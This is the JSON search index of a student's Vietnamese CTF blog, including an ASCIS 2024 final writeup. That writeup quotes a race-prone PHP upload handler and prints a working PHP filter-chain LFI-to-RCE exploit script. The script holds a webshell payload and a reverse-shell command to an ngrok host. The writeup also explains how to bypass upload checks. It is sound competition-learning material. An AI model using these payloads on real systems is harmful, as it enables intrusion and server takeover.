
[{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"\r#\r","date":"22 October 2024","externalUrl":null,"permalink":"/posts/flare-on-11/","section":"Posts","summary":"Flare-On 11 Writeup","title":"Flare-On 11 Writeup","type":"posts"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/tags/reverse/","section":"Tags","summary":"","title":"Reverse","type":"tags"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/","section":"Shr3wd","summary":"","title":"Shr3wd","type":"page"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/authors/shr3wd/","section":"Authors","summary":"","title":"Shr3wd","type":"authors"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"22 October 2024","externalUrl":null,"permalink":"/categories/writeup/","section":"Categories","summary":"","title":"Writeup","type":"categories"},{"content":"❝Being the richest man in the cemetery does not matter to me … Going to bed at night saying we’ve done something wonderful … that’s what matters to me.❞\nHi, I\u0026rsquo;m Minh Tri aka shr3wd.\nI am studying Computer Science at VKU.\nIn CTF, I am a RE, PWN, Web player\nI am currently the President of VSL Information Security Club.\nIf you want to be my teammate, please contact me, I am happy to have you as my companion.\n","date":"21 October 2024","externalUrl":null,"permalink":"/about/","section":"Shr3wd","summary":"","title":"About","type":"page"},{"content":" Cyber Jutsu Web Pentest\nIssued by: Cyber Jutsu Academy\nDate: April 2023\nDescription: This certificate acknowledges that Phạm Minh Trí has successfully completed the Web Penetration Testing course, demonstrating proficiency in identifying and exploiting vulnerabilities in web applications. The course covered various essential techniques and tools used in web security.\nSignatories:\nNguyen Manh Luat, Director, Cyber Jutsu JSC Lam Minh Bao, Course Mentor ","date":"21 October 2024","externalUrl":null,"permalink":"/certificate/","section":"Shr3wd","summary":"","title":"Certificate","type":"page"},{"content":"\rMisc #\rSanity Check #\rBài này flag được đặt ở trong phần alt của ảnh được mô tả ở đề bài\nFlag: ASCIS{WishYouWillHaveAGoodDayAtASCIS2024}\nWeb #\rRootme bro #\rVới bài này, mình nghe web player bên mình bảo là cuối giờ btc mới đưa hint. Trong hint là source code, và trong source code là … flag!?? Chỉ cần đổi ASCIS thành VNISA và submit là done :\u0026gt; Tuy nhiên, khi mình phân tích source code để xem ý tưởng của tác giả thế nào thì phát hiện trong folder exam/page có một file là file_race_condition.php\n⇒ Có lẻ mục đích của tác giả là sử dụng Race Codition để upload được một file php lên hệ thống rôi sau đó RCE để đọc được flag.\nif ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] == \u0026#39;POST\u0026#39;) { $target_dir = \u0026#34;../uploads/\u0026#34;; $user_session = $_SESSION[\u0026#39;user_id\u0026#39;]; $target_file = $target_dir .$user_session.\u0026#39;_\u0026#39;. basename($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $uploadOk = 1; // Move file to target directory without checks if (move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) { // Introduce a delay (simulating a potential race condition window) //sleep(2); // Check MIME type and file type if (checkmime($target_file) \u0026amp;\u0026amp; checkFileType($target_file)) { echo \u0026#34;The file \u0026#34;. htmlspecialchars($target_file). \u0026#34; has been uploaded.\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;The file is stored in \u0026#34; . $target_file . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; //echo \u0026#34;\u0026lt;img src=\u0026#39;$target_file\u0026#39; alt=\u0026#39;Uploaded Image\u0026#39; style=\u0026#39;max-width: 100%; height: auto;\u0026#39;\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; } else { unlink($target_file); echo \u0026#34;Sorry, there was an error uploading your file.\u0026lt;br\u0026gt;\u0026#34;; http_response_code(403); } } else { //echo \u0026#34;Sorry, there was an error moving your file.\u0026lt;br\u0026gt;\u0026#34;; } } ⇒ Qua đoạn code của tác giả thì có thể thấy được file khi upload lên sẽ luôn được move vào folder uploads của người dùng, sau đó file mới được kiểm tra mime và filetype rồi mới bị xóa đi nếu như không hợp lệ.\nQua đây, có thể sử dụng Race Codition để truy cập tới file php đang được upload lên trước khi nó bị xóa đi để có thể RCE được server.\nTrain to server #\rVới bài này thì khi đăng nhập thành công với tài khoản là admin:admin thì sẽ được đưa tới một trang có dính lỗi LFI (Local File Include) với parameter là file . Tuy nhiên, mình thử dò file flag ở một số nơi thì lại không có nên mình đoán là phải RCE nên mình đã thử dùng một số payload wrapper của PHP nhưng nó không hoạt động. Reseach trên mạng thì thấy có một bài tương tự và có sẵn payload nên mình sử dụng để RCE luôn\nimport requests url = \u0026#34;http://183.91.11.30:8889/page.php\u0026#34; file_to_use = \u0026#34;php://temp\u0026#34; command = \u0026#34;php -r \u0026#39;$sock=fsockopen(\\\u0026#34;0.tcp.ap.ngrok.io\\\u0026#34;,18336);exec(\\\u0026#34;sh \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\\\u0026#34;);\u0026#39;\u0026#34; #\u0026lt;?=`$_GET[0]`;;?\u0026gt; base64_payload = \u0026#34;PD89YCRfR0VUWzBdYDs7Pz4\u0026#34; conversions = { \u0026#39;R\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2\u0026#39;, \u0026#39;B\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2\u0026#39;, \u0026#39;C\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR\u0026#39;, \u0026#39;8\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2\u0026#39;, \u0026#39;9\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB\u0026#39;, \u0026#39;f\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213\u0026#39;, \u0026#39;s\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61\u0026#39;, \u0026#39;z\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS\u0026#39;, \u0026#39;U\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932\u0026#39;, \u0026#39;P\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213\u0026#39;, \u0026#39;V\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5\u0026#39;, \u0026#39;0\u0026#39;: \u0026#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2\u0026#39;, \u0026#39;Y\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2\u0026#39;, \u0026#39;W\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2\u0026#39;, \u0026#39;d\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2\u0026#39;, \u0026#39;D\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2\u0026#39;, \u0026#39;7\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2\u0026#39;, \u0026#39;4\u0026#39;: \u0026#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2\u0026#39; } # generate some garbage base64 filters = \u0026#34;convert.iconv.UTF8.CSISO2022KR|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # make sure to get rid of any equal signs in both the string we just generated and the rest of the file filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; for c in base64_payload[::-1]: filters += conversions[c] + \u0026#34;|\u0026#34; # decode and reencode to get rid of everything that isn\u0026#39;t valid base64 filters += \u0026#34;convert.base64-decode|\u0026#34; filters += \u0026#34;convert.base64-encode|\u0026#34; # get rid of equal signs filters += \u0026#34;convert.iconv.UTF8.UTF7|\u0026#34; filters += \u0026#34;convert.base64-decode\u0026#34; final_payload = f\u0026#34;php://filter/{filters}/resource={file_to_use}\u0026#34; r = requests.get(url, params={ \u0026#34;0\u0026#34;: command, \u0026#34;action\u0026#34;: \u0026#34;include\u0026#34;, \u0026#34;file\u0026#34;: final_payload }) print(r.text) RCE server và mình phát hiện flag nằm ở cùng thư mục và nó nằm trong Dockerfile =)))))\n⇒ Đáng ra nên fuzz bài này để tìm flag nhanh hơn :\u0026gt;\nDocMan #\rBài này được cung cấp source code.\nMình thử sử dụng trang web để xem các tính năng của nó thì phát hiện trang web cho phép upload các file pdf|word và cho phép xem hoặc tải xuống các file được upload lên. Tuy nhiên, khi reload lại trang thì đường dẫn tới các file này biến mất???\nOke, tới đây mình phân tích source code và để ý thấy ở file lib.php (Đây là file php dùng để xử lý và filter các file upload lên).\nfunction checkFileName($name) { return preg_match(\u0026#34;/\\.(docx|pdf)$/\u0026#34;, strtolower($name)); } function checkFileType($type) { return preg_match(\u0026#34;/^(application\\/vnd\\.openxmlformats\\-officedocument\\.wordprocessingml\\.document|application\\/pdf)$/\u0026#34;, strtolower($type)); } function checkFileSize($size) { return ($size \u0026gt;= 1000 \u0026amp;\u0026amp; $size \u0026lt;= 100000 ? true : false); } function checkFileMagic($fn) { $handle = fopen($fn, \u0026#39;r\u0026#39;); $magic = strtoupper(bin2hex(fread($handle, 8))); fclose($handle); return ($magic == \u0026#34;504B030414000600\u0026#34; || substr($magic, 0, 8) == \u0026#34;25504446\u0026#34;); } Check extension: extension cuối của file phải là docx hoặc pdf ⇒ Có thể chèn các extension khác vào như a.php .pdf Check File type: file type của các file phải thuộc doc hoặc pdf ⇒ Dùng burp suite hoặc các công cụ chỉnh sửa request khác có thể bypass được. Check file size: ở đây, đoạn code sẽ check size ⇒ Có thể chèn dữ liệu vào file để bypass Check file magic: ở đây đoạn code sẽ check 8 byte đầu của file có khớp với các byte mà dev lập trình sẵn hay không ⇒ Có thể bypass bằng burp ⇒ Tổng hợp lại tất cả, lúc này chỉ cần upload một file php với các lớp bypass trên thì có thể RCE được server và đọc được flag.\n","date":"20 October 2024","externalUrl":null,"permalink":"/posts/ascis-2024-final-jeopardy/","section":"Posts","summary":"ASCIS CTF 2024 Final Writeup","title":"ASCIS 2024 (Final)","type":"posts"},{"content":"","date":"20 October 2024","externalUrl":null,"permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto","type":"tags"},{"content":"","date":"20 October 2024","externalUrl":null,"permalink":"/tags/forensic/","section":"Tags","summary":"","title":"Forensic","type":"tags"},{"content":"","date":"20 October 2024","externalUrl":null,"permalink":"/tags/pwn/","section":"Tags","summary":"","title":"PWN","type":"tags"},{"content":"","date":"20 October 2024","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"\rRE #\rRev-1 #\rDùng strings để xem các chuỗi có trong file binary, flag sẽ hiển thị flag{833450aafcf1a802422ac2bf6c42a304}\nRev-2 #\r","date":"20 September 2024","externalUrl":null,"permalink":"/posts/ddc-2024/","section":"Posts","summary":"Digital Dragon CTF 2024 Qualify Writeup","title":"DDC 2024 (Qualify)","type":"posts"},{"content":"\rWebGoat #\rĐây là writeup các lab trong Webgoat (A1)Broken Access Control\n(A2) Cryptography Failures\n(A3) Injection\n(A5) XXE\n(A6) Vulnerable Components\n(A7) Identity \u0026amp; Auth Failure\n(A8) Insecure Deserialization\n(A9) Security Logging Failures\n(A10) Server-side Request Forgery\nClient side\nChallenges\n","date":"21 August 2024","externalUrl":null,"permalink":"/posts/webgoat/","section":"Posts","summary":"Web Goat Writeup","title":"Web Goat Writeup","type":"posts"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]